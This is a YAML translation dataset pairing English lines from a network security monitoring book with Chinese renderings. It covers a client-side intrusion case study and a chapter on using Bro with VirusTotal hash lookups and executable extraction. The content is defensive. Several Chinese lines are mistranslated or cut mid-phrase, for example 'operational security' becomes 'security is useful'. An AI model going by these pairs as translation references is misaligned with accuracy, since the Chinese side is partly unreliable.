- en: '![Image 145](index-295_1.jpg)'
  id: totrans-1341
  prefs: []
  type: TYPE_IMG
  zh: '![图 145](index-295_1.jpg)'
- en: '**conclusion**'
  id: totrans-1342
  prefs: []
  type: TYPE_NORMAL
  zh: '**结论**'
- en: Our review of this chapter’s example showed that the intruder was very
  id: totrans-1343
  prefs: []
  type: TYPE_NORMAL
  zh: 我们对本章示例的回顾显示，入侵者非常
- en: active on the original victim, 172.16.0.37, and used information gathered
  id: totrans-1344
  prefs: []
  type: TYPE_NORMAL
  zh: 原始受害者 172.16.0.37 仍然活跃，并使用从
- en: from that system to pivot to 10.0.0.99\. The initial review of NSM data out-
  id: totrans-1345
  prefs: []
  type: TYPE_NORMAL
  zh: 从该系统转向 10.0.0.99。初步审查 NSM 数据后，
- en: lined the broad story of the intrusion, but examining the command-and-
  id: totrans-1346
  prefs: []
  type: TYPE_NORMAL
  zh: 概述了入侵的整体情况，但通过检查命令和
- en: control channel helped fill in some blanks. Thanks to the NSM platform
  id: totrans-1347
  prefs: []
  type: TYPE_NORMAL
  zh: 控制通道帮助填补了一些空白。感谢 NSM 平台
- en: capturing full packet data, the Vivian’s Pets CIRT knows what happened
  id: totrans-1348
  prefs: []
  type: TYPE_NORMAL
  zh: 捕获完整的数据包，Vivian’s Pets CIRT 知道发生了什么
- en: to the two systems on its network.
  id: totrans-1349
  prefs: []
  type: TYPE_NORMAL
  zh: 到其网络中的两个系统。
- en: This example of a client-side compromise began with an innocent
  id: totrans-1350
  prefs: []
  type: TYPE_NORMAL
  zh: 这个客户端侧的妥协示例始于一个无辜的
- en: search on Twitter and concluded with two compromised machines and a
  id: totrans-1351
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Twitter 上搜索并得出结论，两个被妥协的机器和
- en: covert channel carrying sensitive information outside the company. Our
  id: totrans-1352
  prefs: []
  type: TYPE_NORMAL
  zh: 隐蔽通道将敏感信息传输到公司外部。我们的
- en: network-centric approach answered many questions about the course of the
  id: totrans-1353
  prefs: []
  type: TYPE_NORMAL
  zh: 网络中心的方法回答了很多关于课程的疑问
- en: intrusion, but it also showed that in some ways, the CIRT got lucky. If the
  id: totrans-1354
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵，但也表明某些方面，CIRT确实有些运气。如果
- en: command-and-control channel between 203.0.113.15 and 172.16.0.37 had
  id: totrans-1355
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.15和172.16.0.37之间的指挥控制通道已经
- en: been encrypted, the CIRT would not have learned critical details about
  id: totrans-1356
  prefs: []
  type: TYPE_NORMAL
  zh: 已加密，CIRT将无法了解关键细节
- en: the intrusion. For that reason, it’s useful to have host-centric forensics and
  id: totrans-1357
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵。因此，进行主机中心的取证和
- en: investigation techniques ready if possible, but that’s a topic for someone
  id: totrans-1358
  prefs: []
  type: TYPE_NORMAL
  zh: 如果可能的话，准备好调查技巧，但这是另一个话题，适合其他人
- en: else’s book!
  id: totrans-1359
  prefs: []
  type: TYPE_NORMAL
  zh: 别人的书！
- en: Speaking of Twitter, the analysts do have some information about
  id: totrans-1360
  prefs: []
  type: TYPE_NORMAL
  zh: 说到推特，分析师们确实有一些关于
- en: the source of the attack. Threat agents are humans who might make bad
  id: totrans-1361
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击的来源。威胁代理是可能做出错误选择的人员
- en: choices. Defenders can sometimes capitalize on these bad choices to better
  id: totrans-1362
  prefs: []
  type: TYPE_NORMAL
  zh: 选择。防御者有时可以利用这些错误选择来更好地
- en: understand the threat and defend the network. In the case of this intrusion,
  id: totrans-1363
  prefs: []
  type: TYPE_NORMAL
  zh: 理解威胁并保护网络。在这个入侵的案例中，
- en: several hours after the covert channel died, the tweet shown in Figure 11-19
  id: totrans-1364
  prefs: []
  type: TYPE_NORMAL
  zh: 在隐蔽通道消失几小时后，图 11-19 中显示的推文
- en: appeared. Pay attention to the bottom of the figure where the tweet’s text
  id: totrans-1365
  prefs: []
  type: TYPE_NORMAL
  zh: 出现了。请注意图像底部推文的文字
- en: appears.
  id: totrans-1366
  prefs: []
  type: TYPE_NORMAL
  zh: 出现。
- en: '*Figure 11-19: Last tweet from* Callbackpnsm'
  id: totrans-1367
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-19：Callbackpnsm的最后一条推文*'
- en: Client-side Compromise **261**
  id: totrans-1368
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端入侵 **261**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1369
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: This tweet is a combination of text and a picture. The tweet says
  id: totrans-1370
  prefs: []
  type: TYPE_NORMAL
  zh: 这条推文是文本和图片的组合。推文写着
- en: “@ubu32pnsm Thanks for checking out the healthcare update. One of
  id: totrans-1371
  prefs: []
  type: TYPE_NORMAL
  zh: “@ubu32pnsm 感谢你查看医疗更新。之一
- en: 'us is #winning. pic.twitter.com/mD4y6eIiqF.” The picture, shown in Fig-'
  id: totrans-1372
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在#获胜。 pic.twitter.com/mD4y6eIiqF。”图中显示的是
- en: ure 11-19, appears to be a screen capture of an Ubuntu desktop; in fact, it
  id: totrans-1373
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11-19 显示的是Ubuntu桌面的屏幕截图；实际上，它
- en: shows the victim user’s system. She is logged in to Twitter as user Ubu32pnsm.
  id: totrans-1374
  prefs: []
  type: TYPE_NORMAL
  zh: 显示受害者用户的系统。她以用户Ubu32pnsm身份登录到推特。
- en: Two Firefox browser tabs are open. The second tab shows part of the URL
  id: totrans-1375
  prefs: []
  type: TYPE_NORMAL
  zh: 打开了两个Firefox浏览器标签。第二个标签显示了部分URL
- en: for the phony *healthcarenews* website on 203.0.113.15\. This intruder thinks
  id: totrans-1376
  prefs: []
  type: TYPE_NORMAL
  zh: 用于虚假的 *healthcarenews* 网站 203.0.113.15 上的攻击者认为
- en: he’s a funny guy, but personalized messages like this could be his undoing.
  id: totrans-1377
  prefs: []
  type: TYPE_NORMAL
  zh: 他是个有趣的人，但像这样的个性化信息可能会成为他的致命弱点。
- en: In order to not get caught, attackers also need to practice sound opera-
  id: totrans-1378
  prefs: []
  type: TYPE_NORMAL
  zh: 为了不被抓住，攻击者还需要练习健全的操作
- en: tional security.
  id: totrans-1379
  prefs: []
  type: TYPE_NORMAL
  zh: 安全性很有用。
- en: '**262** Chapter 11'
  id: totrans-1380
  prefs: []
  type: TYPE_NORMAL
  zh: '**262** 第11章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1381
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**12**'
  id: totrans-1382
  prefs: []
  type: TYPE_NORMAL
  zh: '**12**'
- en: '**e x T e N D i N g S o**'
  id: totrans-1383
  prefs: []
  type: TYPE_NORMAL
  zh: '**扩展之道**'
- en: So far, we’ve been working with the default
  id: totrans-1384
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们一直在使用默认设置
- en: installation of SO. This chapter introduces
  id: totrans-1385
  prefs: []
  type: TYPE_NORMAL
  zh: SO的安装。这一章介绍了
- en: a few ways to extend it. You just need to edit
  id: totrans-1386
  prefs: []
  type: TYPE_NORMAL
  zh: 扩展它的几种方法。你只需要编辑
- en: a few configuration files and download some
  id: totrans-1387
  prefs: []
  type: TYPE_NORMAL
  zh: 一些配置文件，并下载一些
- en: external content to get more from your SO setup.
  id: totrans-1388
  prefs: []
  type: TYPE_NORMAL
  zh: 外部内容来获取更多信息，从你的SO设置中获得更多。
- en: To move beyond the “stock” SO installation, we’ll look at three ways to
  id: totrans-1389
  prefs: []
  type: TYPE_NORMAL
  zh: 为了超越“库存”SO安装，我们将查看三种方式
- en: 'leverage additional functionality provided by the Bro suite:'
  id: totrans-1390
  prefs: []
  type: TYPE_NORMAL
  zh: 利用Bro套件提供的附加功能：
- en: • Use the MD5 hashes logged by Bro with the website VirusTotal or other
  id: totrans-1391
  prefs: []
  type: TYPE_NORMAL
  zh: • 使用Bro记录的MD5哈希值与VirusTotal或其他
- en: third-party analysis engines.
  id: totrans-1392
  prefs: []
  type: TYPE_NORMAL
  zh: 第三方分析引擎。
- en: • Configure Bro to extract binaries from network traffic, so that you can
  id: totrans-1393
  prefs: []
  type: TYPE_NORMAL
  zh: • 配置 Bro 从网络流量中提取二进制文件，这样你就可以
- en: submit those artifacts to third-party analysis engines.
  id: totrans-1394
  prefs: []
  type: TYPE_NORMAL
  zh: 将这些文档提交给第三方分析引擎。
- en: • Integrate external intelligence from Mandiant’s APT1 report with Bro
  id: totrans-1395
  prefs: []
  type: TYPE_NORMAL
  zh: • 将来自Mandiant的APT1报告的外部情报与Bro集成
- en: to generate alert data.
  id: totrans-1396
  prefs: []
  type: TYPE_NORMAL
  zh: 生成警报数据。
- en: The chapter concludes with an example that shows how SO reports and
  id: totrans-1397
  prefs: []
  type: TYPE_NORMAL
  zh: 本章以一个例子结束，展示了如何利用SO报告和
- en: extracts the download of a malicious binary.
  id: totrans-1398
  prefs: []
  type: TYPE_NORMAL
  zh: 提取了恶意二进制文件的下载。
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1399
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**using bro to Track executables**'
  id: totrans-1400
  prefs: []
  type: TYPE_NORMAL
  zh: '**使用 Bro 来跟踪可执行文件**'
- en: When trying to defend an enterprise, CIRTs can benefit by knowing which
  id: totrans-1401
  prefs: []
  type: TYPE_NORMAL
  zh: 在尝试保护企业时，CIRT通过了解哪些
- en: executables users are downloading over the network. Usually, these exe-
  id: totrans-1402
  prefs: []
  type: TYPE_NORMAL
  zh: 用户下载的可执行文件。通常，这些exe
- en: cutables are benign tools or packages that people need to do their jobs, but
  id: totrans-1403
  prefs: []
  type: TYPE_NORMAL
  zh: 可执行文件是人们需要完成工作的一些无害工具或软件包，但
- en: sometimes they’re malicious software. Bro can help you to discover the sorts
  id: totrans-1404
  prefs: []
  type: TYPE_NORMAL
  zh: 有时是恶意软件。Bro可以帮助你发现这类
- en: of executables people are downloading in order to protect them from harm.
  id: totrans-1405
  prefs: []
  type: TYPE_NORMAL
  zh: 以便保护用户免受下载的可执行文件可能带来的危害。
- en: '***Hashing Downloaded Executables with Bro***'
  id: totrans-1406
  prefs: []
  type: TYPE_NORMAL
  zh: '***使用Bro对下载的可执行文件进行哈希计算***'
- en: By default, the version of Bro shipped with SO calculates an MD5 hash (a
  id: totrans-1407
  prefs: []
  type: TYPE_NORMAL
  zh: 默认情况下，SO附带的Bro版本会计算每个可执行文件的MD5哈希（a
- en: cryptographic representation of a file’s contents) for every executable down-
  id: totrans-1408
  prefs: []
  type: TYPE_NORMAL
  zh: 文件内容的加密表示）对于每个下载的可执行文件，
- en: loaded via HTTP. These hash values can help us track the executables
  id: totrans-1409
  prefs: []
  type: TYPE_NORMAL
  zh: 通过HTTP加载。这些哈希值帮助我们跟踪可执行文件
- en: downloaded by users. For example, Listing 12-1 shows how Bro tracks execut-
  id: totrans-1410
  prefs: []
  type: TYPE_NORMAL
  zh: 用户下载的内容。例如，12-1列表展示了Bro如何跟踪执行-
- en: able downloads. The *notice.log* file records data about hashes that Bro gener-
  id: totrans-1411
  prefs: []
  type: TYPE_NORMAL
  zh: 可下载的文件。*notice.log*文件记录了Bro生成的哈希值数据-
- en: ates when it sees executables transferred over HTTP.
  id: totrans-1412
  prefs: []
  type: TYPE_NORMAL
  zh: Bro会记录它看到的通过HTTP传输的可执行文件。
- en: 2013-04-12T13:33:47+0000 mBNkJTlLBfa 192.168.2.108 49630 23.62.236.50 80
  id: totrans-1413
  prefs: []
  type: TYPE_NORMAL
  zh: 2013-04-12T13:33:47+0000 mBNkJTlLBfa 192.168.2.108 49630 23.62.236.50 80
- en: 1 GET download.cdn.mozilla.net /pub/mozilla.org/firefox/releases/20.0.1/
  id: totrans-1414
  prefs: []
  type: TYPE_NORMAL
  zh: 1 GET download.cdn.mozilla.net /pub/mozilla.org/firefox/releases/20.0.1/
- en: win32/en-US/Firefox Setup 20.0.1.exeu http://www.mozilla.org/en-US/products/download.
  id: totrans-1415
  prefs: []
  type: TYPE_NORMAL
  zh: win32/en-US/Firefox Setup 20.0.1.exeu http://www.mozilla.org/en-US/products/download.
- en: html?product=firefox-20.0&os=win&lang=en-US Mozilla/5.0 (Windows NT 6.1; WOW64;
    rv:19.0) Gecko/20100101 Firefox/19.0 0 21036128 200 OK - -
  id: totrans-1416
  prefs: []
  type: TYPE_NORMAL
  zh: html?product=firefox-20.0&os=win&lang=en-US Mozilla/5.0 (Windows NT 6.1; WOW64;
    rv:19.0) Gecko/20100101 Firefox/19.0 0 21036128 200 OK - -
- en: '- (empty) - -- application/x-dosexecv 1e39efe30b02fd96b10785b49e23913bw'
  id: totrans-1417
  prefs: []
  type: TYPE_NORMAL
  zh: '- (空) - -- application/x-dosexecv 1e39efe30b02fd96b10785b49e23913bw'
- en: '-'
  id: totrans-1418
  prefs: []
  type: TYPE_NORMAL
  zh: '-'
- en: '*Listing 12-1: Bro* http .log *entry for download of Firefox binary*'
  id: totrans-1419
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表12-1：Bro* http.log *条目用于下载Firefox二进制文件*'
- en: You can see the download of *Firefox Setup 20.0.1.exe* u, a file of type
  id: totrans-1420
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以看到下载的*Firefox Setup 20.0.1.exe*，一个类型为
- en: application/x-dosexec v, with the hash 1e39efe30b02fd96b10785b49e23913b w.
  id: totrans-1421
  prefs: []
  type: TYPE_NORMAL
  zh: application/x-dosexec v，哈希值为1e39efe30b02fd96b10785b49e23913b w。
- en: By default, Bro reports when it hashes executables and writes an event to
  id: totrans-1422
  prefs: []
  type: TYPE_NORMAL
  zh: 默认情况下，Bro会报告哈希可执行文件并写入事件日志
- en: the Bro *notice.log* file, as shown in Listing 12-2\.
  id: totrans-1423
  prefs: []
  type: TYPE_NORMAL
  zh: Bro的*notice.log*文件，如列表12-2所示\。
- en: 2013-04-12T13:34:01+0000 mBNkJTlLBfa 192.168.2.108 49630 23.62.236.50
  id: totrans-1424
  prefs: []
  type: TYPE_NORMAL
  zh: 2013-04-12T13:34:01+0000 mBNkJTlLBfa 192.168.2.108 49630 23.62.236.50
- en: 80 tcp HTTP::MD5v 192.168.2.108 1e39efe30b02fd96b10785b49e23913b http://
  id: totrans-1425
  prefs: []
  type: TYPE_NORMAL
  zh: 80 tcp HTTP::MD5v 192.168.2.108 1e39efe30b02fd96b10785b49e23913b http://
- en: download.cdn.mozilla.net/pub/mozilla.org/firefox/releases/20.0.1/win32/en-US/Firefox
  id: totrans-1426
  prefs: []
  type: TYPE_NORMAL
  zh: download.cdn.mozilla.net/pub/mozilla.org/firefox/releases/20.0.1/win32/en-US/Firefox
- en: Setup 20.0.1.exeu 1e39efe30b02fd96b10785b49e23913bw 192.168.2.108 23.62.236.50
  id: totrans-1427
  prefs: []
  type: TYPE_NORMAL
  zh: Setup 20.0.1.exeu 1e39efe30b02fd96b10785b49e23913bw 192.168.2.108 23.62.236.50
- en: 80 - sov-eth0-1 Notice::ACTION_LOG 6 3600.000000 F
  id: totrans-1428
  prefs: []
  type: TYPE_NORMAL
  zh: 80 - sov-eth0-1 Notice::ACTION_LOG 6 3600.000000 F
- en: '- - - - - -- -'
  id: totrans-1429
  prefs: []
  type: TYPE_NORMAL
  zh: '- - - - - -- -'
- en: '*Listing 12-2: Bro* notice .log *entry for MD5 calculation*'
  id: totrans-1430
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表12-2：Bro* notice.log *条目用于MD5计算*'
- en: Here, you see the download of *Firefox Setup 20.0.1.exe* u, with Bro’s rec-
  id: totrans-1431
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，你可以看到下载的*Firefox Setup 20.0.1.exe*文件，带有Bro的记录-
- en: ognition that this is an HTTP and requires MD5 hashing v and a match-
  id: totrans-1432
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个HTTP请求，并且需要MD5哈希值v以及匹配-
- en: ing hash 1e39efe30b02fd96b10785b49e23913b w. You can use third-party sources
  id: totrans-1433
  prefs: []
  type: TYPE_NORMAL
  zh: 哈希值为1e39efe30b02fd96b10785b49e23913b w。你可以使用第三方来源
- en: with the hash to get more information about this download.
  id: totrans-1434
  prefs: []
  type: TYPE_NORMAL
  zh: 通过哈希值获取更多关于此下载的信息。
- en: '***Submitting a Hash to VirusTotal***'
  id: totrans-1435
  prefs: []
  type: TYPE_NORMAL
  zh: '***提交哈希值到VirusTotal***'
- en: VirusTotal ( *http://www.virustotal.com/*) is a popular online resource for
  id: totrans-1436
  prefs: []
  type: TYPE_NORMAL
  zh: VirusTotal（*http://www.virustotal.com/*）是一个流行的在线资源，用于
- en: learning more about binaries. In addition to submitting actual files, users
  id: totrans-1437
  prefs: []
  type: TYPE_NORMAL
  zh: 进一步了解二进制文件。除了提交实际文件外，用户
- en: can also submit hashes of binaries to VirusTotal to see if those hashes are
  id: totrans-1438
  prefs: []
  type: TYPE_NORMAL
  zh: 也可以将二进制文件的哈希值提交到VirusTotal，查看这些哈希值是否
- en: '**264** Chapter 12'
  id: totrans-1439
  prefs: []
  type: TYPE_NORMAL
  zh: '**264** 第12章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1440
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 146](index-299_1.png)'
  id: totrans-1441
  prefs: []
  type: TYPE_IMG
  zh: '![Image 146](index-299_1.png)'
- en: '![Image 147](index-299_2.png)'
  id: totrans-1442
  prefs: []
  type: TYPE_IMG
  zh: '![Image 147](index-299_2.png)'
- en: present in the VirusTotal database. If a previous user has already uploaded
  id: totrans-1443
  prefs: []
  type: TYPE_NORMAL
  zh: 在VirusTotal数据库中出现的。如果之前的用户已经上传
- en: a binary with the same hash to VirusTotal, a search for that hash should
  id: totrans-1444
  prefs: []
  type: TYPE_NORMAL
  zh: 如果将具有相同哈希值的二进制文件提交给VirusTotal，搜索该哈希值应该
- en: reveal what VirusTotal knows about the binary submitted earlier.
  id: totrans-1445
  prefs: []
  type: TYPE_NORMAL
  zh: 揭示VirusTotal对之前提交的二进制文件的了解。
- en: To see this functionality at work, we’ll submit the hash logged by Bro
  id: totrans-1446
  prefs: []
  type: TYPE_NORMAL
  zh: 为了看到这个功能的实际效果，我们将提交Bro记录的哈希值，
- en: from Listing 12-1, as shown in Figure 12-1\.
  id: totrans-1447
  prefs: []
  type: TYPE_NORMAL
  zh: 来自12-1列表，如图12-1所示\。
- en: '*Figure 12-1: Submit ing the observed MD5 hash to VirusTotal*'
  id: totrans-1448
  prefs: []
  type: TYPE_NORMAL
  zh: '*图12-1：提交观察到的MD5哈希值到VirusTotal*'
- en: Within a few seconds, we see results like those shown in Figure 12-2\.
  id: totrans-1449
  prefs: []
  type: TYPE_NORMAL
  zh: 几秒钟内，我们可以看到如图12-2所示的结果\。
- en: '*Figure 12-2: VirusTotal results for the submit ed MD5 hash*'
  id: totrans-1450
  prefs: []
  type: TYPE_NORMAL
  zh: '*图12-2：VirusTotal对提交的MD5哈希值的结果*'
- en: VirusTotal has a match for this hash (notice the four angels), and no
  id: totrans-1451
  prefs: []
  type: TYPE_NORMAL
  zh: VirusTotal 为此哈希值找到了匹配项（请注意四个角），且没有
- en: antivirus engines have detected the binary as malicious, as shown in the
  id: totrans-1452
  prefs: []
  type: TYPE_NORMAL
  zh: 杀毒引擎已将该二进制文件标记为恶意，如下所示
- en: Detection Ratio field.
  id: totrans-1453
  prefs: []
  type: TYPE_NORMAL
  zh: 检测比率字段。
- en: The Additional Information tab offers more data on the binaries that
  id: totrans-1454
  prefs: []
  type: TYPE_NORMAL
  zh: “附加信息”标签提供了更多关于二进制文件的数据
- en: VirusTotal has seen with the matching MD5 hash, as shown in Listing 12-3\.
  id: totrans-1455
  prefs: []
  type: TYPE_NORMAL
  zh: VirusTotal 已经看到匹配的 MD5 哈希，如清单 12-3 所示。
- en: First seen by VirusTotal
  id: totrans-1456
  prefs: []
  type: TYPE_NORMAL
  zh: 首次由 VirusTotal 看到
- en: 2013-04-10 22:10:23 UTC ( 6 days, 20 hours ago )
  id: totrans-1457
  prefs: []
  type: TYPE_NORMAL
  zh: 2013-04-10 22:10:23 UTC（6 天 20 小时前）
- en: Last seen by VirusTotal
  id: totrans-1458
  prefs: []
  type: TYPE_NORMAL
  zh: 最后由 VirusTotal 看到
- en: 2013-04-17 15:29:15 UTC ( 3 hours, 8 minutes ago )
  id: totrans-1459
  prefs: []
  type: TYPE_NORMAL
  zh: 2013-04-17 15:29:15 UTC（3 小时 8 分钟前）
- en: File names (max. 25)
  id: totrans-1460
  prefs: []
  type: TYPE_NORMAL
  zh: 文件名（最多 25 个）
- en: '**Firefox_Setup_20.0.1.exe**'
  id: totrans-1461
  prefs: []
  type: TYPE_NORMAL
  zh: '**Firefox_Setup_20.0.1.exe**'
- en: '**Firefox Setup 20.0.1.exe**'
  id: totrans-1462
  prefs: []
  type: TYPE_NORMAL
  zh: '**Firefox Setup 20.0.1.exe**'
- en: Extending SO **265**
  id: totrans-1463
  prefs: []
  type: TYPE_NORMAL
  zh: 扩展 SO **265**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1464
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: test.exe
  id: totrans-1465
  prefs: []
  type: TYPE_NORMAL
  zh: test.exe
- en: 7zS.sfx.exe
  id: totrans-1466
  prefs: []
  type: TYPE_NORMAL
  zh: 7zS.sfx.exe
- en: Firefox_Setup_20.0.1GB32.exe
  id: totrans-1467
  prefs: []
  type: TYPE_NORMAL
  zh: Firefox_Setup_20.0.1GB32.exe
- en: TtfjHao4.exe.part
  id: totrans-1468
  prefs: []
  type: TYPE_NORMAL
  zh: TtfjHao4.exe.part
- en: '**Firefox_Setup_20.0.1.exe**'
  id: totrans-1469
  prefs: []
  type: TYPE_NORMAL
  zh: '**Firefox_Setup_20.0.1.exe**'
- en: 7zS.sfx
  id: totrans-1470
  prefs: []
  type: TYPE_NORMAL
  zh: 7zS.sfx
- en: file-5362262_exe
  id: totrans-1471
  prefs: []
  type: TYPE_NORMAL
  zh: file-5362262_exe
- en: Firefox%20Setup%2020.0.1.exe
  id: totrans-1472
  prefs: []
  type: TYPE_NORMAL
  zh: Firefox%20Setup%2020.0.1.exe
- en: '*Listing 12-3: First seen, last seen, and filename information from VirusTotal*'
  id: totrans-1473
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 12-3：从 VirusTotal 获取的首次见到、最后见到和文件名信息*'
- en: As highlighted in bold, names referencing Firefox setup ( *Firefox_*
  id: totrans-1474
  prefs: []
  type: TYPE_NORMAL
  zh: 如加粗部分所示，引用 Firefox 安装程序的名称（*Firefox_*
- en: '*Setup_20.0.1.exe*) are the same as the binary we observed in our Bro logs,'
  id: totrans-1475
  prefs: []
  type: TYPE_NORMAL
  zh: '*Setup_20.0.1.exe*）与我们在 Bro 日志中观察到的二进制文件相同，'
- en: but others, like file-5362262_exe, are completely different.
  id: totrans-1476
  prefs: []
  type: TYPE_NORMAL
  zh: 但是其他文件，比如 file-5362262_exe，完全不同。
- en: This analysis is helpful, but not conclusive. It would be better to have
  id: totrans-1477
  prefs: []
  type: TYPE_NORMAL
  zh: 这个分析有帮助，但并不具有决定性。最好能有
- en: copies of the binaries themselves, not just their hashes. We could do more
  id: totrans-1478
  prefs: []
  type: TYPE_NORMAL
  zh: 二进制文件本身的副本，而不仅仅是它们的哈希值。我们可以做更多
- en: analysis with the original artifacts.
  id: totrans-1479
  prefs: []
  type: TYPE_NORMAL
  zh: 分析与原始文物的配合使用。
- en: '**using bro to extract binaries from Traffic**'
  id: totrans-1480
  prefs: []
  type: TYPE_NORMAL
  zh: '**使用 bro 从流量中提取二进制文件**'
- en: By default, Bro with SO logs MD5 hashes of binaries downloaded over
  id: totrans-1481
  prefs: []
  type: TYPE_NORMAL
  zh: 默认情况下，Bro 使用 SO 记录通过 HTTP 下载的二进制文件的 MD5 哈希值
- en: HTTP, but it does not extract the binaries and save them to disk. It’s easy
  id: totrans-1482
  prefs: []
  type: TYPE_NORMAL
  zh: HTTP，但它不会提取二进制文件并将其保存到磁盘。它很简单
- en: to configure Bro to take these actions, however, but we do need to be care-
  id: totrans-1483
  prefs: []
  type: TYPE_NORMAL
  zh: 配置 Bro 以采取这些措施，但我们确实需要小心
- en: ful not to overwhelm the sensor with the extracted binaries. To reduce that
  id: totrans-1484
  prefs: []
  type: TYPE_NORMAL
  zh: 需要小心，不要让传感器因为提取的二进制文件而超负荷。为了减少这种情况
- en: potential problem, we’ll tell Bro to extract Windows executables downloaded
  id: totrans-1485
  prefs: []
  type: TYPE_NORMAL
  zh: 潜在问题，我们将告诉 Bro 提取下载的 Windows 可执行文件
- en: over HTTP and FTP only.
  id: totrans-1486
  prefs: []
  type: TYPE_NORMAL
  zh: 仅通过 HTTP 和 FTP。
- en: '***Configuring Bro to Extract Binaries from Traffic***'
  id: totrans-1487
  prefs: []
  type: TYPE_NORMAL
  zh: '***配置 Bro 提取流量中的二进制文件***'
- en: Bro inspects traffic and generates logs based on the *policy scripts* that ship
    with the default installation. Policy scripts are the ways analysts use the *Bro*
  id: totrans-1488
  prefs: []
  type: TYPE_NORMAL
  zh: Bro 检查流量并根据默认安装中附带的*策略脚本*生成日志。策略脚本是分析人员使用的*Bro*
- en: '*network programming language* (a term popularized by Liam Randall) to tell'
  id: totrans-1489
  prefs: []
  type: TYPE_NORMAL
  zh: '*网络编程语言*（由 Liam Randall 推广的术语）来告知'
- en: the Bro engine what to do with the traffic it sees.
  id: totrans-1490
  prefs: []
  type: TYPE_NORMAL
  zh: 告诉 Bro 引擎该如何处理它看到的流量。
- en: Bro reports what it finds using logfiles and messages that it creates
  id: totrans-1491
  prefs: []
  type: TYPE_NORMAL
  zh: Bro 通过它创建的日志文件和消息报告它所发现的内容
- en: using its *notice framework*. (You’re encouraged to leave the default scripts
  id: totrans-1492
  prefs: []
  type: TYPE_NORMAL
  zh: 使用其*通知框架*。（建议你保留默认脚本
- en: alone, and to make changes to the policy scripts found in the */opt/bro/share/*
  id: totrans-1493
  prefs: []
  type: TYPE_NORMAL
  zh: 独立使用，并且对在*/opt/bro/share/*中找到的策略脚本进行更改
- en: '*bro/site/* directory.)'
  id: totrans-1494
  prefs: []
  type: TYPE_NORMAL
  zh: '*bro/site/* 目录。）'
- en: To reconfigure Bro to extract Windows executables downloaded over
  id: totrans-1495
  prefs: []
  type: TYPE_NORMAL
  zh: 重新配置 Bro，以提取通过 Windows 下载的可执行文件
- en: HTTP and FTP, we start by creating a place to store extracted content with
  id: totrans-1496
  prefs: []
  type: TYPE_NORMAL
  zh: HTTP 和 FTP，我们首先通过创建一个地方来存储提取的内容
- en: 'this command:'
  id: totrans-1497
  prefs: []
  type: TYPE_NORMAL
  zh: 这个命令：
- en: $ **sudo mkdir -p /nsm/bro/extracted/http/ /nsm/bro/extracted/ftp/**
  id: totrans-1498
  prefs: []
  type: TYPE_NORMAL
  zh: $ **sudo mkdir -p /nsm/bro/extracted/http/ /nsm/bro/extracted/ftp/**
- en: Next, we create a copy of the *local.bro* policy script for safekeeping.
  id: totrans-1499
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们创建 *local.bro* 策略脚本的副本以备份。
- en: $ **sudo cp /opt/bro/share/bro/site/local.bro** **/opt/bro/share/bro/site/local.bro.orig**
    **266** Chapter 12
  id: totrans-1500
  prefs: []
  type: TYPE_NORMAL
  zh: $ **sudo cp /opt/bro/share/bro/site/local.bro** **/opt/bro/share/bro/site/local.bro.orig**
    **266** 第 12 章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1501
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Now we edit the *local.bro* file. (I’m using the vi editor, but use any editor
    you like, such as the Leafpad program bundled with SO.)
  id: totrans-1502
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们编辑 *local.bro* 文件。（我使用的是 vi 编辑器，但可以使用你喜欢的任何编辑器，例如与 SO 一起捆绑的 Leafpad 程序。）
- en: $ **sudo vi /opt/bro/share/bro/site/local.bro**
  id: totrans-1503
  prefs: []
  type: TYPE_NORMAL
  zh: $ **sudo vi /opt/bro/share/bro/site/local.bro**
- en: Listing 12-4 shows the content to add at the very bottom of the *local.bro*
    file.
  id: totrans-1504
  prefs: []
  type: TYPE_NORMAL
  zh: 清单 12-4 显示了需要添加到 *local.bro* 文件底部的内容。
- en: Extract EXEs
  id: totrans-1505
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 提取 EXE 文件
- en: redef HTTP::extract_file_types += /application\/x-dosexec/;u
  id: totrans-1506
  prefs: []
  type: TYPE_NORMAL
  zh: 重定义 HTTP::extract_file_types += /application\/x-dosexec/;u
- en: redef FTP::extract_file_types += /application\/x-dosexec/;v
  id: totrans-1507
  prefs: []
  type: TYPE_NORMAL
  zh: 重定义 FTP::extract_file_types += /application\/x-dosexec/;v
- en: Extract files to /nsm/bro/extracted/
  id: totrans-1508
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 提取文件到 /nsm/bro/extracted/
- en: redef HTTP::extraction_prefix = "/nsm/bro/extracted/http/http-item";
